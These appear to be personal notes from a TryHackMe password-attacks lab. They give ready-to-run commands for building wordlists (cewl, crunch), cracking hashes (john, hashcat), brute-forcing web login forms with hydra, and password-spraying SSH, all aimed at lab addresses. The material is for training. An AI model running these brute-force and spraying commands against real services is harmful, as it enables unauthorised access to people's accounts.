# room
https://tryhackme.com/room/passwordattacks

# task 1 - intro
* passwords are used as an authentication method

# task 2 - password attacking techniques
* password cracking - discover passwords from encrypted or hash data
* password guessing - guess passwords based on dictionaries

# task 3 - default, weak, leaked, combined, and username wordlists
* default passwords
* weak passwords
* leaked passwords
* wordlists
    * cewl

# task 4 - keyspace, cupp
* keyspace - limit total character space
    * crunch
        * crunch 2 2 01234abcd -o crunch.txt
        * crunch 5 5 -t THM^^ -o tryhackme.txt
* cupp - common user password profiler
    * create custom wordlists based on a user profile

# task 5 - dictionary and brute force
* dictionary attack - use well known words, phrases
* hashes
    * hashcat, hashid
* brute force - guess using a wordlist
    * hashcat, john
* hashid 8d6e34f987851aa599257d3831a1af040886842f
* john -w=/usr/share/wordlists/rockyou.txt h.txt
* hashcat -a 3 -m 0 h2.txt ?d?d?d?d

# task 6 - rule based
* rule based AKA hybrid attacks - assumes attacker knows something about the password policy
* john built in rules
    * cat /etc/john/john.conf | grep "List.Rules:" | cut -d":" -f2 | cut -d"]" -f1
    * john --wordlist=temp.txt --rules=best64 --stdout | wc -l
    ```
    john --wordlist=temp.txt --rules=KoreLogic --stdout | grep "Tryh@ckm3"
    Using default input encoding: UTF-8
    Press 'q' or Ctrl-C to abort, almost any other key for status
    Tryh@ckm3
    Tryh@ckm3
    7089833p 0:00:00:01 100.00% (2022-02-25 08:45) 4487Kp/s tryhackme999999
    ```

# task 7 - deploy VM
deploy VM

# task 8 - online password attacks
* generate a wordlist using cewl
```
cewl -w clinic.txt -d 5 -m 8 https://clinic.thmredteam.com/
```
* generate a wordlist using john from cewl output
```
john --wordlist=clinic.txt --rules=Single-Extra --stdout > single-extra.txt          
```
* use hydra to attack get and post forms
```
hydra -l phillips -P single-extra.txt 10.10.3.141 http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php" -vvv -I

hydra -l burgess -P single-extra.txt 10.10.3.141 http-post-form "/login-post/index.php:username=^USER^&password=^PASS^:S=logout.php" -f -vvv -t 32 -I
```

# task 9 - password spray attack
* password spraying targets many usernames using one common weak password
* common weak passwords follow a trend like current season and date
* create custom wordlist
```
rm -f spray.txt;for year in $(seq 2019 2022);for season (Spring spring Summer summer Fall fall Winter winter);for char (\! \@ \# $);do echo $season$year$char >> spray.txt;done 
```
* use hydra to attack SSH with the custom wordlist
```
hydra -L users.txt -P spray.txt ssh://10.10.73.168:22 -vvv -t 4 -I    
```

# task 10 - conclusion
conclusion